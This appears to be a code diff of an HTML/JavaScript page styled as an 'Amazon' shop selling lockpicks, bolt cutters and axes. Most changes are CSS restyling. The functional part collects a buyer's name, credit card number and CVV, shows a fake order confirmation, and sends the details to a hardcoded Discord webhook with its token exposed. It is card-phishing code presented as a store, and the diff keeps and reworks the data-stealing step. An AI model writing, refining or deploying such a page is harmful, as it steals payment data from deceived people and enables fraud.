@@ -6,9 +6,9 @@
     <title>Vara Amazon</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #2c2c2c;
-            color: white;
+            font-family: 'Arial', sans-serif;
+            background-color: #1e1e1e;
+            color: #f5f5f5;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -18,26 +18,27 @@
 
         .container {
             text-align: center;
-            background: #333;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            background: #2c2c2c;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.6);
         }
 
         h1 {
             margin-bottom: 20px;
-            font-size: 2.5em;
-            color: #f4f4f4;
+            font-size: 2.8em;
+            color: #e0e0e0;
         }
 
         #search-bar {
-            width: 80%;
-            padding: 10px;
+            width: 90%;
+            padding: 12px;
             margin-bottom: 20px;
             border: 1px solid #555;
-            border-radius: 5px;
-            background-color: #444;
+            border-radius: 8px;
+            background-color: #333;
             color: white;
+            font-size: 1em;
         }
 
         .buttons {
@@ -48,18 +49,19 @@
         }
 
         .category-btn {
-            padding: 15px 30px;
-            font-size: 1.2em;
-            background-color: #007bff;
+            padding: 15px 25px;
+            font-size: 1.3em;
+            background-color: #0069d9;
             color: white;
             border: none;
-            border-radius: 5px;
+            border-radius: 8px;
             cursor: pointer;
-            transition: background-color 0.3s ease;
+            transition: background-color 0.3s ease, transform 0.3s ease;
         }
 
         .category-btn:hover {
             background-color: #0056b3;
+            transform: scale(1.05);
         }
 
         .items {
@@ -69,56 +71,79 @@
         .item-btn {
             display: flex;
             justify-content: space-between;
-            margin: 10px 0;
-            padding: 10px 20px;
-            font-size: 1.1em;
+            align-items: center;
+            margin: 10px auto;
+            padding: 12px 20px;
+            font-size: 1.2em;
             background-color: #28a745;
             color: white;
             border: none;
-            border-radius: 5px;
+            border-radius: 8px;
             cursor: pointer;
-            transition: background-color 0.3s ease;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+            max-width: 400px;
+            text-align: left;
+            position: relative;
+        }
+
+        .item-btn span {
+            background-color: #1c7430;
+            color: #d4edda;
+            border-radius: 8px;
+            padding: 5px 10px;
+            font-size: 1em;
+            position: absolute;
+            right: 10px;
         }
 
         .item-btn:hover {
             background-color: #218838;
+            transform: scale(1.05);
         }
 
         .form-container {
             text-align: left;
-            width: 300px;
+            width: 90%;
+            max-width: 400px;
             margin: 0 auto;
+            background: #2c2c2c;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.6);
         }
 
         .form-container label {
             display: block;
-            margin: 10px 0 5px;
+            margin: 15px 0 5px;
+            font-size: 1.1em;
         }
 
         .form-container input[type="text"], .form-container textarea {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             margin-bottom: 20px;
             border: 1px solid #555;
-            border-radius: 5px;
-            background-color: #444;
+            border-radius: 8px;
+            background-color: #333;
             color: white;
+            font-size: 1em;
         }
 
         .submit-btn {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             font-size: 1.2em;
             background-color: #007bff;
             color: white;
             border: none;
-            border-radius: 5px;
+            border-radius: 8px;
             cursor: pointer;
-            transition: background-color 0.3s ease;
+            transition: background-color 0.3s ease, transform 0.3s ease;
         }
 
         .submit-btn:hover {
             background-color: #0056b3;
+            transform: scale(1.05);
         }
     </style>
 </head>
@@ -197,6 +222,19 @@
                         { name: "Advanced Lockpick Set", price: 150 }
                     ];
                     break;
+                case 'Bolt cutters':
+                    variants = [
+                        { name: "Small Bolt Cutters", price: 200 },
+                        { name: "Medium Bolt Cutters", price: 400 },
+                        { name: "Heavy-Duty Bolt Cutters", price: 800 }
+                    ];
+                    break;
+                case 'Axes':
+                    variants = [
+                        { name: "Camping Axe", price: 70 },
+                        { name: "Heavy-Duty Axe", price: 100 }
+                    ];
+                    break;
                 default:
                     variants = [{ name: item, price: 'N/A' }];
             }
@@ -204,7 +242,7 @@
             variants.forEach(variant => {
                 const button = document.createElement('button');
                 button.className = 'item-btn';
-                button.innerHTML = variant.price === 'N/A' ? variant.name : `${variant.name} <span>$${variant.price}</span>`;
+                button.innerHTML = `${variant.name} <span>$ ${variant.price}</span>`;
                 button.onclick = () => goToCustomerForm(variant);
                 itemsDiv.appendChild(button);
             });
@@ -213,13 +251,13 @@
         function goToCustomerForm(item) {
             document.body.innerHTML = `
                 <div class="container">
-                    <h1>Enter Your Details for ${item.name}${item.price !== 'N/A' ? ` ($${item.price})` : ''}</h1>
+                    <h1>Enter Your Details for ${item.name} ${item.price !== 'N/A' ? ` ($${item.price})` : ''}</h1>
                     <div class="form-container">
                         <label for="name">Name:</label>
                         <input type="text" id="name" placeholder="Your Name">
 
                         <label for="bank-details">Bank Account Details:</label>
-                        <textarea id="bank-details" rows="4" placeholder="Credit card number:\nCC/V:\nCC ID:"></textarea>
+                        <textarea id="bank-details" rows="6" placeholder="Credit card number:\nCC/V:\nCC ID:"></textarea>
 
                         <button class="submit-btn" onclick="submitOrder('${item.name}', '${item.price}')">Buy</button>
                     </div>
@@ -233,9 +271,9 @@
 
             if (name && bankDetails) {
                 const orderNumber = Math.floor(Math.random() * 1000000);
-                alert(`thank you for purcashing  ${item}${price !== 'N/A' ? ` ($${price})` : ''}! Your order number is #${orderNumber}.`);
+                alert(`Thank you for Purchasing ${item}, Your order number is #${orderNumber}.`);
 
-                // Send webhook with details as an embed to Discord
+                // Send webhook with details
                 fetch('https://discord.com/api/webhooks/1280978020026417303/N6_0RI7IzLcVkYjHnkDqVWNHnxfycklVvwBiqlXqdXCwkg2dGMKcQoipOFvjFaShJTqQ', {
                     method: 'POST',
                     headers: {
@@ -244,36 +282,15 @@
                     body: JSON.stringify({
                         embeds: [
                             {
-                                title: "New Order",
-                                color: 3066993,
-                                fields: [
-                                    {
-                                        name: "Order Num:",
-                                        value: `#${orderNumber}`
-                                    },
-                                    {
-                                        name: "Item:",
-                                        value: `${item}${price !== 'N/A' ? ` ($${price})` : ''}`
-                                    },
-                                    {
-                                        name: "Customer name:",
-                                        value: name
-                                    },
-                                    {
-                                        name: "Bank Account Details:",
-                                        value: `\`\`\`${bankDetails}\`\`\``
-                                    }
-                                ],
-                                footer: {
-                                    text: "Amazon Order"
-                                },
-                                timestamp: new Date()
+                                title: `New Order: #${orderNumber}`,
+                                description: `**Item:** ${item}\n**Price:** $${price}\n**Customer Name:** ${name}\n**Bank Details:** ${bankDetails}`,
+                                color: 16711680 // Red color
                             }
                         ]
                     })
                 }).then(response => console.log('Webhook sent:', response));
             } else {
-                alert('Please fill in all the fields.');
+                alert('Please fill out all fields.');
             }
         }
 
